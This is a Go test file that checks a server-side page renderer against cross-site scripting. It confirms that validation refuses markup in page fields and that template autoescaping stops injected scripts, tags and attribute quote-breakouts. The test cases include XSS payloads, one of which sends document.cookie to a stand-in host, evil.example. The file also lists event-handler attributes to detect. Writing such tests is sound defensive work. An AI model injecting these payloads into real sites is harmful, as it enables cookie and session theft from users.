package ssrshell

import (
	"strings"
	"testing"

	"golang.org/x/net/html"

	"github.com/monstercameron/hcm-next/tools/uxqual/pagedef"
)

// TestTodo_WEB_025_Security proves two distinct things:
//
//  1. Render refuses (via pagedef.Validate, which it always calls first) any
//     PageDefinition carrying markup or script -- the primary defense.
//  2. Even bypassing that defense entirely (calling the unexported
//     renderValid directly, which this package's own tests can do but no
//     caller outside it can), html/template's autoescaping still stops the
//     malicious text from ever being emitted as raw HTML, a raw <script>
//     element, or an early close of the one <script> element this package
//     does emit -- defense in depth, not a second way to skip validation.
func TestTodo_WEB_025_Security(t *testing.T) {
	cases := []struct {
		name    string
		mutate  func(*pagedef.PageDefinition)
		refused bool // whether pagedef.Validate is expected to refuse this mutation
	}{
		{
			name: "script tag in a heading",
			mutate: func(pd *pagedef.PageDefinition) {
				pd.Regions[1].Heading.Text = `<script>document.location='https://evil.example/'+document.cookie</script>`
			},
			refused: true,
		},
		{
			name:    "img onerror in a heading",
			mutate:  func(pd *pagedef.PageDefinition) { pd.Regions[1].Heading.Text = `<img src=x onerror=alert(1)>` },
			refused: true,
		},
		{
			name:    "HTML in a region id",
			mutate:  func(pd *pagedef.PageDefinition) { pd.Regions[1].ID = `<b>identity</b>` },
			refused: true,
		},
		{
			name:    "HTML in a widget ref",
			mutate:  func(pd *pagedef.PageDefinition) { pd.Regions[4].Widgets[0].WidgetRef = `<script>alert(1)</script>` },
			refused: true,
		},
		{
			name:    "quote-breakout attempt in a region id (no angle brackets, so pagedef.Validate admits it)",
			mutate:  func(pd *pagedef.PageDefinition) { pd.Regions[1].ID = `identity" onmouseover="alert(1)` },
			refused: false,
		},
		{
			name:    "script-closing text in the page id",
			mutate:  func(pd *pagedef.PageDefinition) { pd.PageID = `test.page</script><script>alert(1)</script>` },
			refused: true,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pd := validMinimalPage()
			tc.mutate(&pd)

			_, err := Render(pd)
			if tc.refused && err == nil {
				t.Fatalf("Render() = nil error, want a refusal (pagedef.Validate should reject this input)")
			}
			if !tc.refused && err != nil {
				t.Fatalf("Render() = %v, want no error (this mutation carries no forbidden markup)", err)
			}

			// Defense in depth: even bypassing Validate, the template
			// layer itself must never emit the malicious text raw.
			rs, err := renderValid(pd)
			if err != nil {
				t.Fatalf("renderValid (bypassing Validate) returned an unexpected error: %v", err)
			}
			assertNoRawMarkupLeaked(t, rs.HTML)
		})
	}
}

// assertNoRawMarkupLeaked checks the two structural guarantees the WEB-025
// Security matrix entry names: markup is escaped rather than emitted raw,
// and the document still carries exactly one <script> element (the JSON
// data island), never a second one a malicious field value might have
// tried to inject.
func assertNoRawMarkupLeaked(t *testing.T, doc string) {
	t.Helper()

	if strings.Contains(doc, "<script>") {
		t.Errorf("document contains a raw, executable <script> element:\n%s", doc)
	}
	if strings.Contains(doc, "<img ") {
		t.Errorf("document contains a raw <img> element from field text:\n%s", doc)
	}
	if strings.Contains(doc, "<b>") || strings.Contains(doc, "</b>") {
		t.Errorf("document contains raw <b> markup from field text:\n%s", doc)
	}
	if got := strings.Count(doc, "<script"); got != 1 {
		t.Errorf("document has %d <script tags, want exactly 1 (the data island); a mutated field broke out of it:\n%s", got, doc)
	}
	if got := strings.Count(doc, "</script>"); got != 1 {
		t.Errorf("document has %d </script> closing tags, want exactly 1; a mutated field's literal \"</script>\" text leaked through unescaped:\n%s", got, doc)
	}

	// A quote-breakout in an attribute value (no angle brackets, so
	// pagedef.Validate does not catch it) would not change the string
	// counts above at all -- it would only be visible as a NEW attribute
	// on the element the malicious text was written into. Parsing the
	// document as HTML and checking for known injection attribute names
	// catches that case even though the substring checks above cannot.
	root, err := html.Parse(strings.NewReader(doc))
	if err != nil {
		t.Fatalf("rendered document does not parse as HTML: %v", err)
	}
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode {
			for _, a := range n.Attr {
				switch strings.ToLower(a.Key) {
				case "onmouseover", "onerror", "onclick", "onload", "onfocus", "onmouseenter":
					t.Errorf("document has an injected event-handler attribute %s=%q on <%s>: an attribute-value quote broke out into a new attribute:\n%s", a.Key, a.Val, n.Data, doc)
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(root)
}
